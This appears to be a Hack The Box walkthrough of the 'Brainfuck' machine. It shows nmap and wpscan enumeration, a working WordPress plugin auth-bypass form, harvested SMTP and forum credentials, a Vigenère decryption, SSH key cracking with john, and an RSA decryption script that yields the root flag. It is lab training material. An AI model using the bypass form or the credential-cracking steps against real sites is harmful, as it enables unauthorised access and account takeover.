```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) UIDL PIPELINING AUTH-RESP-CODE CAPA USER TOP RESP-CODES
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 more capabilities OK ENABLE listed IMAP4rev1 post-login Pre-login LOGIN-REFERRALS SASL-IR ID LITERAL+ IDLE have
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So this box have ssh, mail services and https, let's start by enumerating https

<br/>

When I go to https://10.10.10.17 there's a warning and I can check the certificate, in this certificate I can find a mail address orestis@brainfuck.htb, and two DNS names: www.brainfuck.htb and sup3rs3cr3t.brainfuck.htb, I'll add this to /etc/hosts

<br/>

brainfuck.htb is a wordpress site and sup3rs3cr3t.brainfuck.htb is a forum

<br/>

I'll start by enumerating wordpress with wpscan

```bash
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks
```

There's wp-support-plus-responsive-ticket-system that is outdated and have some exploits, i'll use this one: https://www.exploit-db.com/exploits/41006

<br/>

So I create a file with the extension .html and i put this:

```bash
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Now set up a server with python

```bash
sudo python3 -m http.server 80
```

![brainfuck1](/images/htb-brainfuck/brainfuck1.png)

Now I'll click in login and after a while it's blank so I'll go to https://brainfuck.htb and I'm admin

<br/>

Now let's go to Settings -> Easy WP SMTP and there's a password that can be seen with dev tools

![brainfuck2](/images/htb-brainfuck/brainfuck2.png)

So I have smtp credentials for orestis, let's login using evolution

![brainfuck3](/images/htb-brainfuck/brainfuck3.png)

![brainfuck4](/images/htb-brainfuck/brainfuck4.png)

![brainfuck5](/images/htb-brainfuck/brainfuck5.png)

In the inbox there are two mails

![brainfuck6](/images/htb-brainfuck/brainfuck6.png)

![brainfuck7](/images/htb-brainfuck/brainfuck7.png)

Now I have credentials for the forum orestis:kIEnnfEKJ#9UmdO, I logged in and there are 3 posts

![brainfuck8](/images/htb-brainfuck/brainfuck8.png)

And there's an ecrypted post

![brainfuck9](/images/htb-brainfuck/brainfuck9.png)

In the other post orestis everytime leaves a signature is this case is: Orestis - Hacking for fun and profit so the encrypted signature is Pieagnm - Jkoijeg nbw zwx mle grwsnn

<br/>

With rumkin using one time pad the key can be found

![brainfuck10](/images/htb-brainfuck/brainfuck10.png)

And now with the key we can decrypt the text using keyed vigenere

![brainfuck11](/images/htb-brainfuck/brainfuck11.png)

![brainfuck12](/images/htb-brainfuck/brainfuck12.png)

And the id_rsa key can be downloaded from that url

<br/>

The key is encrypted so let's crack it

```bash
$ sudo python /opt/ssh2john.py id_rsa > hash
$ sudo john --wordlist=/opt/wordlists/rockyou.txt hash
3poulakia!
```

And with the passphrase you can log in
```bash
$ ssh -i id_rsa orestis@10.10.10.17
```

<br/>

In the home directory there are the files:

```bash
$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
```

This can be decrypted because they gave as p,q,e and ct

```bash
$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

```bash
$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

<br/>

I'll use this script to decrypt it changing the values

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

And now decode the pt

```python
$ python
>>> y = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> str(hex(y))
'0x3665666331613564626238393034373531636536353636613330356262386566L'
>>> '3665666331613564626238393034373531636536353636613330356262386566'.decode('hex')
'6efc1a5dbb8904751ce6566a305bb8ef'
```

<br/>

This is the root flag, I can't login as root so here the box finish
